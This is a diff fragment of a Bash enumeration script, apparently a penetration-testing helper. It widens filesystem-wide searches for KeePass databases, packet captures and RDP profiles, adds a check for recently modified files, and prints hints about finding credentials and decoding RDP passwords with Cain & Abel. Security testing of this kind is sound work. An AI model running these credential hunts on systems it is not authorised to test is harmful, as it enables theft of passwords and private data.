 echo -e "[*] .kdb files:"
-    find / -name *.kdb -type f 2>/dev/null
+    find / -iname *.kdb -type f 2>/dev/null
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║KeePass is a free open source password manager, which helps you to manage your passwords in ║"
         echo -e "\t║a secure way. You can store all your passwords in one database, which is locked with a      ║"
@@ -823,13 +858,19 @@ echo -e "\n${BLUE}[+] Current user trash files:${XX}"
         echo -e "\t║Have a look at the trash files and see if you can find any useful information.              ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n${BLUE}[+] Wireshark files:${XX}"
-    find / -name *.pcapng -type f 2>/dev/null --color=always
-    find / -name *.libpcap -type f 2>/dev/null --color=always
+    find / -iname *.pcapng -type f 2>/dev/null --color=always
+    find / -iname *.libpcap -type f 2>/dev/null --color=always
 echo -e "\n${BLUE}[+] RDP Profiles:${XX}"
-    find / -name *.RDP -type f 2>/dev/null --color=always
-    find / -name *.rdp -type f 2>/dev/null --color=always
+    find / -iname *.RDP -type f 2>/dev/null --color=always
+    find / -iname *.rdp -type f 2>/dev/null --color=always
         echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
         echo -e "\t║Decode the RDP Password using Cain & Abel. So, open Cain & Adel the go to                   ║"
         echo -e "\t║    Tools > Remote Desktop Password Decoder $ then load the RDP profile to decode.          ║"
+        echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
+echo -e "\n${BLUE}[+] Modified Files Past 60 min:${XX}"
+    find /* -mmin -60 -xdev 2>/dev/null | grep -v '/proc/\|/sys/' | xargs ls -ld --color=always 2> /dev/null
+        echo -e "\t╔════════════════════════════════════════════════════════════════════════════════════════════╗"
+        echo -e "\t║It can be useful to check files that were modified recently, as they may be containing      ║"
+        echo -e "\t║useful information and/or credentials.                                                      ║"
         echo -e "\t╚════════════════════════════════════════════════════════════════════════════════════════════╝"
 echo -e "\n\n${RED}\t\tEnumeration is completed ╔═══════════════════════════════════(100%)═══════════════════════════════════╗${XX}\n\n"
